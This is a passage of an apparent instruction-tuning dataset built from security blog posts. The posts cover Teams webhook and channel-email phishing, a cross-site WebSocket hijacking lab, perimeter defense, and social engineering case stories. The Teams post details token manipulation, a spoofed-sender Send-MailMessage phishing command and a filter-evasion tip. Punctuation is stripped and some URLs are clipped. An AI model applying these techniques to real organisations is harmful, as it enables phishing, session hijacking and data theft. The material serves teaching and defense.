Cake You can register HERE"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Wishing: Webhook Phishing in Teams</title>\n<taxonomies>External/Internal, Matthew Eidelberg, Phishing, Red Team, Red Team Tools, Persistence, Teams, Webhooks</taxonomies>\n<creation_date>Thu, 14 Mar 2024 13:10:52 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Quick Jump What Are Microsoft Connectors What Are Webhooks How Do We Get These Webhooks So What Can We Do with These Webhooks Enumerating Channels Create Your Own Webhooks Channel Emails Enumeration Sending Channel Emails Defender Insight In the constantly evolving landscape of cybersecurity it is common to see features designed for convenience lead to negative cybersecurity consequences Microsoft Teams an essential tool for corporate communication contains features and configurations that are susceptible to abuse The following items are particularly ripe for abuse By default users can configure incoming webhooks in any channels they have access to By default users can view unique webhook URLs created by other users in any channel they have access to At time of writing webhooks cannot be configured to use authentication Teams has an obscure feature to create an email address for a given channel This email can be abused to send phishing messages to an organization's Teams channels The end result for attackers is a variety of ways to abuse Teams for post-exploitation mainly to send phishing messages This article will explore these vulnerabilities in detail discussing their implications for organizations What Are Microsoft Connectors First let's provide some context around the Teams connectors feature Microsoft Teams connectors allow users to integrate external services and tools directly into their Teams channels and conversations They are designed to enhance team collaboration by bringing in content and updates from various external applications services or platforms making them easily visible to all members of a channel Some common examples of connectors include Azure GitHub Jira Trello RSS feeds and many others These updates are posted within the team's channel as messages allowing team members to stay informed and react in real time without leaving the Teams interface These connectors can be easily created by any users in a channel by simply going to a given channel's settings and clicking on the edit button under Connectors This provides you with a list of Microsoft-approved connectors to configure It's important to note that there are hundreds of possible connectors Figure 1 Sample Connector Catalog Once a connector is selected the creation process is as simple as just naming your connector filling in the required options and then creating it Figure 2 Creating a Connector All these connectors are connected to Microsoft Teams using webhooks Figure 3 Connector's Webhook URL What Are Webhooks Webhooks are HTTP callbacks that are triggered by specific events When such an event occurs the source site makes an HTTP request to the URL configured for the webhook The action performed by this HTTP request can vary it could be data being sent as in POST requests data modification or any number of different actions The data sent is typically in the form of a JSON or XML payload which is then processed by the receiving application Webhooks are different from APIs in how they receive data With an API data is obtained through polling where an application periodically makes requests to an API server to check for new data In contrast a webhook allows the server to push data to your application instantly when an event occurs hence sometimes referred to as reverse APIs or push APIs This makes webhooks less resource-intensive compared to APIs as they eliminate the need for constant polling Webhooks are particularly useful for automating tasks and integrating different software applications They are quick to set up and can automate data transfer saving time and resources Microsoft allows webhook connectors as a simple way to connect an application to a Microsoft Teams channel inside Microsoft Teams Incoming webhooks allow your users to send text messages from a channel to your web services Connector-based webhooks allow users connect receive notifications and messages from your web services So why do we care about webhooks Because we can use them to send messages into a Teams channel This is great for phishing as Teams messages avoid email filters When phishing via a webhook the message will appear as though it was sent by a legitimate connector app which could lead to less suspicion from the target users How Do We Get These Webhooks We've created a module within GraphRunner to enumerate configured webhooks that a compromised user has access to If you want to try it out run Get-Webhooks for more information Now let's walk through the reverse engineering process required to build this module First let's grab a bearer token for a target user using Get-GraphTokens If you aren't familiar with GraphRunner yet please check it out HERE Figure 4 GraphRunner Getting GraphToken Once we have this token we can take it and pass it to ogin.microsoftonline.com with the scope of outlook.office365.com connectors Using Burp Suite we can see the POST request and in that we receive an access_token that is tied to api.spaces.skype.com This type of token will grant us access to skype aka Microsoft Teams Figure 5 Access_token for api.spaces.skype.com Next we take the contents of that access_token and rename it as a Single Sign-on token Sstoken which is used for seamless authentication within Office and all its addons This request is then passed to outlook.office.com connectors Manage AuthorizeUsingToken?client SkypeSpaces This URI allows a user to authenticate to the management interface of the connectors using tokens We specify the client as SkypeSpaces as that's the reference for Microsoft Teams Figure 6 GET Request to Connectors Manage AuthorizationUsingToken The response we get provides us with a ton of cookies that grant access to Microsoft Teams resources through office.com These cookies are BearerTokenFromWorkload SkypeSpaceTokens __RequestionVerificationToken_L2Nvbm51Y3RvCnM1 yes this random number is the same across different users .AspNet.ApplicationCookie X-XSRF-Token Figure 7 Response from Connectors Manage AuthorizationUsingToken The important cookies are BearerTokenFromWorkload and SkypeSpaceTokens These provide access to certain resources in this case because we pointed it at the connectors it will all be focused on the connector apps Disclaimer We inferred this information from reverse engineering without official documentation from Microsoft It could be wrong or subject to change as APIs evolve The BearerTokenFromWorkload tokens provide access to a resource whereas SkypeSpacesTokens provides the type of access to the resource defined by the BearerTokenFromWorkload tokens SkypeSpaceTokens are not well documented but allow certain features or integrations within Microsoft Teams Very similar to Graphtokens SkypeSpaceTokens allow for authentication and authorization within Microsoft Teams eco-space particularly when integrating or enabling certain features external applications and connectors Figure 8 Decoded BearerTokenFromWorkload and SkypeSpaceToken Now that we have the proper cookies and token values we can start to enumerate all the information related to webhooks in a channel The first thing we need is the connector configuration information This can easily be done by querying the connectors Manage Configuration URI along with the Tenant Teams ID and Channel ID However when we send a request we receive an Error message instead Figure 9 Error Response This shouldn't happen so to understand what the issue is we can use Burp Suite to intercept legitimate traffic coming from a web browser-based version of Microsoft Teams We can see that all the cookies are the same however on further inspection we find there is a slight difference in the SkypeSpaceToken size Figure 10 Valid Request from Microsoft Teams via The Web Browser By reviewing our Burp history we can see that this smaller version of the SkypeSpaceToken is set from a POST request to the API eams.microsoft.com api authsvc v1.0 authz however this token value is actually labeled as a SkypeToken This API only requires a bearer token to authenticate but it is important to note that this API and token is only for teams.microsoft.com and not office.com Figure 11 Creation of SkypeToken This SkypeToken is quite different than the original one SkypeSpaceToken created previously As mentioned before there is not a lot of documentation around these cookies however decoding the JWT value shows that this cookie is very different from the ones we received previously As shown below the contents of this token indicate the OrganizationID and the user ID which indicates that this cookie is used to identify those who are requesting information about a channel shared between multiple individuals who have permissions inside the same channel but are not necessarily the owner Figure 12 Decoded SkypeToken Once we have this SkypeToken we can then take the value of this SkypeToken and replace it with the value of SkypeSpacesToken We can do this using PowerShell's System.Net.CookieContainer to create a temporary set of cookies Once we have this new set we parse through all the cookies stored by searching for SkypeSpacesToken Once found it replaces the value with the SkypeToken value In doing so we take a cookie created for teams.microsoft.com and use it with office.com Figure 13 Modifying Cookies With this modification we can run the request again and this time we receive an HTTP response 200 This gives us the ability to query the manage configuration URI This page contains all the configuration information for all the installed webhooks in a channel Figure 14 Decoded Webhook Information As you can see from the screenshot above this request provides all the information related to webhooks in a channel however it does not provide the URL associated with each webhook This is where the Configuration ID value comes into play This value is a unique identifier for each webhook in a channel to know which one webhook to interact with specifically Using the same cookies along with the following TeamID TenantID ChannelID Configuration ID we can send a GET request to utlook.office.com connectors IncomingWebhook Manage Show and parse the response to find the webhook's URL Figure 15 Webhook's URLs Using the Get-Webhooks module we can request all the webhooks in all the channels a user has access to by looping through all Teams channels a user is currently a part of Figure 16 Webhook's URLs So What Can We Do with These Webhooks Let's craft an HTTP POST request that will send a message to the channel configured with a connector This can be done from the internet without authentication beyond the webhook URL itself This is because all webhooks connectors by default do not come with any authentication mechanism attached to them i.e NTLM hash Bearer Tokens This makes connectors great for persistence or phishing your way back in If you lose access to a target environment credentials are changed sessions revoked but you have valid webhook URLs you can send an internal Teams message with the added bonus of appearing as the configured connector application These messages must follow a specific format known as Primary Message Card JSON These message cards allow for a user to embed images links and even action buttons that when pressed trigger something such as going to a specific URL Microsoft has a great article on how to structure this type of JSON code Figure 17 Sample Primary Message Card JSON Figure 18 Example of the Webhook Message Enumerating Channels Understanding your target and creating a realistic ruse plays a vital part in the success of this attack This means we need some information about the channels we are targeting with our webhook phish WISHING Luckily Microsoft has provided us functionality in the Graph API to pull this information Using the Get-ChannelUsersEnum module we can enumerate the following Channel Description Number of Channel Members List of Channel Members including email address Channel Owner Figure 19 Example of GraphRunner's Get-ChannelUsersEnum Module Create Your Own Webhooks What if there are no Webhooks in any channels that you have access to No problem thanks to Microsoft's configuration of these connectors any user that is part of a channel can create a connector with a webhook This includes low privilege users To programmatically create a webhook we use Burp once again to observe a POST request that is sent to the connectors IncomingWebhook Manage Create API This API creates webhooks with specific settings inside a channel based on the contents of a webkit form submission This webkit form requires several values we can set ourselves however there are several that need to be generated by Microsoft These include _RequestVerificationToken AlternativeID Value ForwardToEmail value By reviewing the creation process through Burp we can see a request to a different API connectors IncomingWebhook Manage New occurring before the webkit form submission POST request This API is important because this is where those above values are generated for the webkit however much like how we enumerated webhooks discussed previously we need to first generate a SkypeToken cookie to request them Once we have that value and replace it as our SkypeSpaceToken value we can send a GET request to this API to generate those missing values Figure 20 Request to Get Values Needed for Creating a Webhook Figure 21 Example of Webkit Form But that's not all we need if we just send the request to the API we see that we get an error response This is because of a weird requirement which I haven't found a reason for in which we must specify the main or General channel ID as the SkypeSpacesTeamId value instead of the channel we want to put the webhook in By doing so the webhook is still created in the proper channel as the real ChannelId is stored in the SSThread parameter as well Figure 22 Webkit Request Response Error Figure 23 Webkit Request with the SkypeSpacesTeamID set to the General Channel's ID Response Success While this process can seem extensive the module Create-Webhooks does this all for you Figure 24 Webkit Request with the SkypeSpacesTeamID set to the General Channel's ID Response Success Figure 25 Webhook Created in Channel Channel Emails Enumeration While webhooks are one way to communicate inside Microsoft Teams there is another way to get access Microsoft Teams has you covered with the Get email address feature The Get email address feature in Microsoft Teams channels allows each channel to have its own unique email address Figure 26 Teams Channel Email Address Creation This feature enables members or external users to send emails directly to a specific channel This feature is particularly useful for organizations that interact with clients or third parties via email These email addresses are a randomly generated set of characters making it hard to enumerate unauthenticated In addition by default every channel does not come with an associated email address Rather they get assigned when a user requests one through the Get Email Address feature or Microsoft Teams Channel Email API Microsoft claims that this feature needs to be enabled by the Administrator however through testing we can see this is not the case Figure 27 Microsoft Documentation on This Feature This API is quite simple to query all we need is our bearer token and an X-SkypeToken You will notice that the X-SkypeToken looks like a SkypeToken created by the eams.microsoft.com api authsvc v1.0 authz API that's because it is the same token just with a different name Once we have this X-SkypeToken the only other thing we need is the channel ID value With these values we can perform a series of HTTP requests to do different things GET Requests Checks if the channel has an email address set If it does it will respond with the email address and the permissions set for that email address If there is no email address it will respond with a status code NotFound Figure 28 Get Request to Get the Channel Email Address Information Figure 29 Response If There Is No Account Already Created POST Requests This sends a request to create the email address As mentioned before this address is generated randomly so we can't specify what to set it as We can however define the allowedSenderType In our case we can set it to be anyone This means external users can send messages to this address with no issues Figure 30 POST Request to Create a Channel Email Address PUT Requests Allows us to change the current values of allowedSenderType if an email address already exists Figure 31 PUT Request to Update a Channel Email Address's AllowedSenderType Figure 32 Get Request Verifying the Updated a Channel Email Address's AllowedSenderType The module Get-ChannelEmail can automate this process first looking for the email address if there is one it then checks to ensure it's set to anyone If there is no channel email address this module then creates an email address with the anyone permission Figure 33 Example of GraphRunner's Get-ChannelEmail Module Sending Channel Emails With the channel email address set to anyone we could send an email directly to that channel from any email outside of the organization While this sounds easy Exchange Online Protection EOP still applies to email filtering To send emails to a channel email we have a few options If we have an external email address to send from and the channel email address to send to we can use any mail client to send the mail with our email address hint eveloper.microsoft.com en-us microsoft-365 dev-program to create a tenant you can phish from Otherwise we can use a tool like ithub.com rvrsh3ll FindIngresEmail to find domains that may be allowed through EOP To send a message we may use the Send-MailMessage PowerShell command For more information on the command check out the Microsoft documentation earn.microsoft.com en-us powershell module microsoft.powershell.utility send-mailmessage?view powershell-7.3 We suggest using the command in an Azure Console as your connection will come from a Microsoft IP address and not be blocked by Spamhaus as if you were to send it from a residential IP address Send-MailMessage -Body 'Required Enrollment Benefits Enrollment -To TestShared MSFT_Derp_Devs 7d685121.derpdevs.onmicrosoft.com amer.teams.ms -From noreply eircom.net -Subject Benefits Enrollment -SmtpServer amer-teams-ms.mail.protection.outlook.com -BodyAsHtml Figure 34 Successful Teams Email Message As you can see the email landed successfully in the Teams channel Since inbound emails to Teams channels pass through EOP addresses from some domains may be blocked or the content blocked or any other Anti-Spam Spoofing or other filters may apply For more information on how to test this check out the BHIS blog here ww.blackhillsinfosec.com spamming-microsoft-365-like-its-1995 Also the channel shows a Download original email link Once the user clicks the link a .eml file is downloaded Opening the .eml file will load the email in the user's default mail app such as Outlook Several malicious possibilities exist there that can help facilitate initial access Defender Insight BHIS disclosed this issue in January 2024 At the time of this writing these findings have been submitted to MSRC and closed per Microsoft without a fix The intent of this article is to highlight the dangers of these features in Microsoft Teams and help defenders defend against them Unfortunately until Microsoft enforces authentication on the webhooks used for these connectors there isn't a way to prevent external messages from getting in So what can Administrators do Well Microsoft doesn't make it easy As of right now Microsoft either allows any users to install connector apps or no one There is no in between As these are vital for organizations to connect and integrate information from various external applications services or platforms outright disabling these apps may not be an option for most organizations Figure 35 Microsoft Teams Admin Org-Wide Settings for Team's Apps Until these issues are addressed by Microsoft blue teamers need to rely on Microsoft Teams message-based detections rules that look for anomalous messages to detect this kind of abuse It is also important to note that if a user adds a connector to a team and then leaves the team or is disabled or removed from the organization that connector and webhook continues to work Microsoft does have some security controls to limit users ability to send messages to a channel Figure 36 Microsoft Teams Admin Org-Wide Settings for Team's Email Integration However further investigations into this option show that when this is turned off the option is removed only the Team's UI both web client and desktop client to request or view it However the API still allows requests and updates Figure 37 Microsoft Teams Client missing the Channel Get Email Address Figure 38 Example of GraphRunner's Get-ChannelEmail Module Still Working Be sure to tune in next Thursday 3 21 at 2 05pm ET for Matthew's webcast Microsoft Teams Abuse w Matthew Eidelberg You can register HERE"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Can't Stop, Won't Stop Hijacking (CSWSH) WebSockets</title>\n<taxonomies>How-To, InfoSec 201, Jack Hyland, Web App, cross-site websocket hijacking, CSWSH, SOP, websocket</taxonomies>\n<creation_date>Thu, 21 Mar 2024 13:29:27 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "The WebSocket Protocol standardized in 2011 with RFC 6455 enables full-duplex communication between clients and web servers over a single persistent connection resolving a longstanding limitation of HTTP that hindered bidirectional client to server communication For example if you'd like to receive real-time sports updates for a game your web browser would need to send a request to the web server once every second checking if there were any changes to the score With WebSockets the server sends your browser the updates as they happen removing the need for constant polling This reduces bandwidth usage and delays experienced by the user for real-time events The differences between the traditional HTTP connection and a WebSocket connection are illustrated below Notice that after the handshake the WebSocket session remains connected and is bidirectional while in a traditional HTTP transaction the connection is terminated requiring a new request WebSocket vs HTTP This blog will demonstrate how to exploit the handshake step of the WebSocket protocol allowing a malicious webpage to hijack a WebSocket using the victim's cookies Each time I've encountered an application using WebSockets on a penetration test with meaningful functionality this vulnerability was present The impact has ranged from privilege escalation to remote code execution For a more general overview of WebSocket hacking reference our previous blog post How to Hack WebSockets and Socket.io Understanding and Detecting WebSockets I'll be using Burp Suite Academy's free online lab so anyone can follow along The lab occasionally timed out and needed to be refreshed which caused a slight change in the subdomain name throughout the blog First things first you need to determine if the web application you are testing uses WebSockets The best way to go about this is to set up Burp Suite to capture traffic and click around every page you see Most of the time only a small component of the site will use WebSockets so you'll have to search around Next open Burp Suite and click the Proxy WebSockets history tabs to view any captured WebSocket traffic If nothing appears then no WebSocket traffic was found As shown below the chat endpoint appeared to send and receive data over WebSockets WebSocket Communication from Live Chat Captured in Burp Suite Let me backtrack a bit and give some context to how the WebSocket connection was established in the first place It all starts with good ole HTTP as you can see in the image above Browsing to the chat endpoint returned an HTML document with the following reference to a JavaScript file Cross-site WebSocket hijacking Back to lab description LAB Not solved Home My account Live chat Live chat 0a4600e703cc3f7b867e3026000f00da.web-security-academy.net chat Your message Send Now that we have the malicious website saved we can send it to our victim who should have a pre-established session on the vulnerable website For simplicity we will pretend to be the victim and open the webpage within our Chrome or Chromium-based browser As shown below the user's chat history is automatically populated even though we are outside the context of a4600e703cc3f7b867e3026000f00da.web-security-academy.net The attacker's webpage has full control over the victim's authenticated WebSocket connection Malicious Website Hijacked Victim's WebSocket If we intercept the traffic we can see that the victim's cookies were automatically appended to the PortSwigger lab server request made by the malicious website This is allowed by the browser since the samesite flag for the session cookie was set to None Also we see that the Origin header is set to null this is because the webpage was not hosted on a web server with a domain name but instead a file on our hard drive It's important to note that the Origin header cannot be modified via JavaScript and is considered a forbidden header name by the browser.4 HTTP Handshake Between Victim's Browser and the Server Solve the Lab To solve the PortSwigger lab click on the Go to exploit server button at the top of the lab webpage and enter the code below into the body of the message This process in the lab simulates a social engineering scenario where a victim with a session renders our malicious JavaScript within their browser Make sure to modify the subdomain highlighted in red to match your PortSwigger lab instance Next click Store followed by Deliver exploit to victim Once the victim's browser renders the following JavaScript their WebSocket connection to the lab instance will be hijacked the READY command is sent and the chat history returned to the exploit server is base64 encoded inside a GET parameter value Once all of that is done click on Access log and CTRL F for msg This will show you the exfiltrated base64-encoded messages sent and received by the victim Feel free to go through and decode each one however the third one down will have the username and password Access Log with the Victim's Base64 Chat Messages Go to the decoder tab in Burp Suite and paste the base64-encoded string Next decode it as base64 and then HTML to get the plain text JSON As shown below the username is carlos and the password is the long random string Note that this password will not work for your lab so you'll have to reproduce each of the steps to get the points Decoded Victim Chat String On the home page of the lab click My account to submit the username and password retrieved in the previous step This will solve the lab CSWSH Lab Successfully Solved Defense To properly defend against this attack the WebSocket server should block any requests during the HTTP handshake with origin values outside of a strict allowlist Additionally user session cookies should be set with samesite equal to Lax or Strict Real Attack Scenarios I've seen this vulnerability multiple times on penetration tests and each time it was possible to combine CSWSH with other findings leading to a higher impact for the report Here are some anecdotal experiences An application had two portals one for volunteers and a second for government workers The dynamic functionality of both applications relied solely on WebSockets A malicious page was able to hijack the government worker's WebSocket and perform administrative tasks A CSWSH vulnerability was discovered in an admin portal along with a remote code execution vulnerability within the WebSocket This allowed an exploit chain to be crafted where a malicious site would hijack the victim's WebSocket and then establish a reverse shell through the WebSocket back to the attacker's infrastructure References ook.hacktricks.xyz pentesting-web WebSocket-attacks ortswigger.net web-security WebSockets cross-site-WebSocket-hijacking Footnotes"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>In Through the Front Door - Protecting Your Perimeter</title>\n<taxonomies>General InfoSec Tips & Tricks, Incident Response, Informational, Terry Reece, externally exploitable services</taxonomies>\n<creation_date>Thu, 28 Mar 2024 14:00:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "While social engineering attacks such as phishing are a great way to gain a foothold in a target environment direct attacks against externally exploitable services are continuing to make headlines In this blog we'll cover things you can do to better protect externally exposed network resources If you haven't reviewed your external footprint in some time this is a good read to help you examine your current configurations and give you some ideas on better securing external infrastructure Some of the largest breaches in recent memory were due to exposed applications that suffered from remotely exploitable vulnerabilities Many of us are probably familiar with vulnerabilities like Log4Shell1 ProxyShell2 and the MOVEit3 breaches While these vulnerabilities were initially 0-days continued exploitation took place well after patches were available from the vendors What can we do to protect ourselves Let's look at some questions we can ask to help ensure our external infrastructure is as secure as possible What is Accessible and Why Knowing what you have is the first step in being able to protect it For a network this means asking what services are accessible from the internet and why they are accessible Keep an updated inventory of open ports and software in use making sure you regularly review this data to keep it accurate and current In a past life as an incident responder it was not uncommon to learn that a breach was the result of a legacy firewall rule that was forgotten Some of these situations allowed an adversary to obtain remote access to internal resources when there was no longer a legitimate business need for the port to be open on the firewall Some ports were opened for testing purposes containing an overly broad scope and never closed others were opened for legitimate reasons but facilitated access to applications with known vulnerabilities that were exploitable remotely Taking a thorough inventory of externally accessible services and software packages in use will go a long way in helping you understand ways to better secure your environment Regular external vulnerability scans and port scanning checking all ports are useful ways to accomplish this Tools such as commercial vulnerability scanners4 Nmap5 and masscan6 are useful Other resources such as Shodan.io 7 can also give you an idea of what ports and protocols are open on your networks These tools can help with verifying network changes after deploying new systems or decommissioning older systems Check vendor websites for security advisories and general product updates for any software packages in use Ensuring your software is up-to-date and properly patched will go a long way in helping prevent successful breaches Once patches have been applied it is always a good idea to use a vulnerability scanner or manual testing to verify the patch was applied and the vulnerability had been mitigated Consequences of Exploitation Now that we know what we are opening to the world and why let's ask ourselves What would happen if these services were exploited If a public-facing service is breached where can the attacker move to next Will they be able to access your entire network from a single compromised host or will they be in a network that restricts or delays immediate lateral movement Answering these questions requires some knowledge of your network architecture For example do you have a DMZ configured to separate internal resources from public-facing web servers I have encountered many networks with NAT rules in place allowing direct access to servers on an internal network This configuration risks making further exploitation easier versus having an attacker boxed into a DMZ with fewer or more difficult options for lateral movement This is particularly important if the software being exploited is through a 0-day A vendor patch may not yet be available but having the proper separation in place between externally accessible services and your internal network may be the only way to mitigate broader impact until a patch is available Employee remote access is also a relevant topic to review in this process particularly with the rise of remote workers It is a good idea to examine how your users are accessing network resources externally Where possible keep the resources accessible only through a VPN that is protected with a strong password and multi-factor authentication If a user requires external access to internal network services it is a better choice to facilitate this access through a VPN instead of opening ports through a firewall Audit Logs Are Your Friend Now that you know what you have and why it is accessible and you possess an understanding of the impact if those services were to be exploited you will also want to know what is happening while others are interacting with those services The best way to address this is to ensure audit policies are in place and log files are captured for analysis and general log retention This is a critical step and key to understanding the full impact of a breach Ensuring your logging mechanisms are in place and correctly configured is critical Sadly I have been on IR engagements where firewall logs were only written to memory with no more than a few hours of logs available well past the timeframe of the suspected breach If you don't have a SIEM at a minimum offload firewall logs to a syslog server Other instances where a client's Microsoft 365 tenant did not have audit logging enabled were also common A lack of log data can make it very difficult in some cases impossible to fully answer critical questions about events during a breach Audit logging should always be enabled and the resulting logs should be captured and stored for subsequent analysis and retention Summary In this blog we've talked about knowing what is accessible on your external network and why how network architecture is important and addressed the need for good auditing and logging practices While this is not a catch-all process and there are many other related topics to consider these are good starting points to better understand your environment and how to defend it"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>The Human Element in Cybersecurity: Understanding Trust and Social Engineering</title>\n<taxonomies>Informational, Phishing, Physical, Red Team, Social Engineering</taxonomies>\n<creation_date>Fri, 05 Apr 2024 14:48:58 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Human Trust Most people associated with information technology roles understand the application of technical controls like the use of firewalls encryption and security products for defenses against digital threats Proper configuration and implementation of these defense tools in keeping with industry best practices doesn't hurt when it comes to fending off attacks However the vulnerability in human trust is something that can't be precisely controlled like a firewall can Trust is what human relationships are based on and relates to both the offline and online realms In the digital realm it takes on a unique dimension Online interactions often lack the physical cues that individuals rely on during face-to-face communication making it easier for cybercriminals to exploit this vulnerability In cybersecurity trust manifests in various ways Trust in Authority People tend to trust those in positions of authority or those posing as such When authority is exerted people often comply with requests without questioning the legitimacy of the authority Trust in Familiarity Trusting someone due to existing or prior relationships is often exploited by hackers by impersonating acquaintances or using information gathered from social media to appear trustworthy Trust in Urgency Pressure coming from a sense of urgency causes individuals to act quickly without having the time to scrutinize the authenticity of the request Social Engineering The term sociale injenieurs Social Engineers was first used by Dutch industrialist J.C Van Marken in an essay in 1894 Later the term had evolved into social engineering which referred to an approach of treating social relations as machineries However social engineering or manipulating the psychology of others has been around since the beginning of time As social engineering relates to cybersecurity it is commonly defined as coercing manipulating someone with the goal of obtaining valuable information In essence social engineering is aimed at exploiting the human trust There are several tactics utilized by hackers to acquire the valuable information These tactics might be used on their own or chained together Phishing This attack is associated with electronic mail An email is sent with the goal of appearing to be legitimate communication that will entice a user to complete the activity desired by the attacker like clicking on a malicious link The outcome is based on the goal of the attack The user action may result in credential harvesting malware execution or other more complex attacks Data is often compromised when the attack is successful Spear Phishing This is the same as a phishing attack except instead of targeting a large audience a specific individual is targeted These types of attacks usually require a significant amount of research on the specific target Whaling Same as a phishing attack but usually targeted toward high-profile users such as executives or members of the C-Suite Smishing Phishing over instant messaging usually via a Short Message Messaging Service SMS also known as a phone text Vishing Performing social engineering via a phone call Baiting An attacker entices the user with a free item to lure them into clicking on a link Get a free sandwich if you take the survey at the following link Quid Pro Quo This is a variation of Baiting where the attacker gives something for something Example would be getting a free software download if you click a malicious link Catfishing Attacker creates a fake online identity to lure others into false relationships Pretexting The attacker impersonates a representative from a trusted organization hoping that the target doesn't question the legitimacy of the attacker Reverse Social Engineering The attacker does not initiate direct contact with the target The target is tricked into contacting the attacker The attacker is in distress and needs help Watering Hole An attacker compromises a legitimate website that their targets are known to visit When the site is visited by the target malware is deployed Scareware These are where an attacker inserts malicious code into a website which causes the page to render a pop-up window with flashing colors and alarming sounds to entice the user into clicking a link or downloading malware Urgency The attacker creates a sense of urgency or fear in the target to convince the target to perform the attacker's desired activities Honeytrap An attack which specifically targets individuals looking for love on online dating websites or social media Diversion Theft An attacker tricks a target into sending or sharing sensitive data with the wrong person Tailgating Is a physical attack where an attacker follows someone into a secure or restricted area that they are not authorized access to Physical Mail Phishing Sending a letter or postcard to a target in the hope that they will perform the desired actions of the attacker As you can see there are several types of attacks These attacks have the goal of getting a target to perform desired actions of the attacker In some cases the attacker might ask them to provide sensitive internal details password policy user's password etc or to perform some unauthorized action password reset Multi-Factor Authentication reset etc or to run a legitimate tool like QuickAssist In addition some ruses like device code abuse are more complicated requiring a user to submit a code on a legitimate site granting the attacker access Social Engineering Real World Examples As a penetration tester I have had the opportunity to conduct social engineering attacks Below are a few that I found to be entertaining Much More Than a Social Engineering Call One of my favorite social engineering calls happened to be against a customer who wanted me to attempt to get employees to go to a website I controlled The website was a doppelganger of a commerce site which sold wearable items Having malicious content on the site was not in scope for the test as the customer just wanted to get some insight on how their employees would react to the social engineering calls One of the targets that I picked out was a secretary for one of the C-Suite executives After conducting research about the company I was able to acquire the help desk number While spoofing the help desk number I called the secretary and told her that I was from IT I told the employee that I was a representative from the IT department that was trying to track down a possible threat I asked the secretary to proceed to my website and click on a link embedded in it The secretary obliged and I got a log entry that contained her IP address showing proof that she had clicked on the link which redirected her to another page The secretary told me that she had never been to that site before I told her that I believed her and I had some more investigating to do before I could conclude if the threat was legitimate I thanked her for her time and then attempted to end the phone call after stating that I had everything I needed from her She however had questions about personal online hygiene related to her passwords I couldn't help myself and spent over an hour on the phone answering her questions before ending the call Giving It to the Phisher Several years ago a colleague and I were on a Red Team engagement together and sent a phishing email to many of the client's employees The context of the email was that there was an update to the company's benefits package which provided a link to view document this ruse had been highly successful during other engagements When they clicked on the link they were redirected to a Microsoft login page and after inputting their credentials a document about benefits was presented to the user In this scenario we attempted to capture login credentials so that we could use them to access data We launched the phish early that morning and watched the log file on our server for credentials After about an hour we finally got a hit and were excited about having valid credentials to use for further exploitation But after looking at the credentials we found that the username was blank and the password was Your Mom After communicating with the customer about the unsuccessful phishing attempt they were very apologetic about the message and I told them not to be because it was an awesome comeback to our phishing ruse Yes as a pentester you are not always successful on the first attempt Flustered During a Physical First I would like to state that with any physical assessment you have to be able to think on your feet Since you hardly ever know what you will run into or what type of situation you will be presented with the ability to rehearse all situations is not feasible or possible This is also true when conducting different types of social engineering tests such as social engineering calls For this particular engagement the customer wanted us to infiltrate the main headquarters of a company with the goal of gaining access into their data center We had already performed physical assessments on three other facilities operated by the company and were successful at two of them This was our second target of the day which didn't give us much time as it was already 3 30pm The headquarters building had a very small entry way where a receptionist was located behind a big glass window There was a door to the receptionist's left visible to her and a hallway on the other side where the receptionist had no visibility The ruse included matching work shirts with a generic logo on it The logo was duplicated on the fake work order that we created which stated that maintenance was to be performed in the data center We had placed our point of contact on the work order as a contact person Since we didn't have a lot of time to prepare for this site due to this location being added to the scope at the last minute we were sure that we would get turned away and would be tasked with testing their guest procedure Both my colleague and I entered the small entrance to the building and presented the receptionist the work order I stated that we are running a little behind and were hoping to get this job done before they closed at 5pm While the receptionist was looking at the work order I attempted to answer her questions before she was able to ask them This seemed to frustrate and distract her While I had the receptionist distracted I motioned to my colleague to slip into the hallway My colleague had taken the cue and took off without the receptionist noticing The receptionist didn't realize that my colleague was gone and contacted our point of contact to confirm the work order When the point of contact arrived she had entered the reception area from the door that adjoined the entrance The point of contact turned me away stating that the work was not authorized I left and then called her from the parking lot I explained that we used the work order ruse to get my colleague into the building unnoticed and asked if we could proceed The point of contact stated that it was a good ruse and didn't realize that we had someone inside the building We were authorized to proceed with the test I left out of the front door and texted my colleague who had found himself locked in a stairwell which had access to the loading dock on the main level and the data center door on the other level I met him at the loading dock where he let me into the stairwell Once at the data center door we found a gap in the door which was covered with a plate so that the hasp was not exposed We performed a hasp bypass by using a wire found under the stairwell with gold bells on them yes a Christmas decoration After opening the door we were met with an employee who caught us bad timing The lessons learned from the social engineering calls and physical engagements prompted the customers to review and edit their policies and procedures This included training requirements for identifying social engineering tactics From the examples above you can see how various social engineering 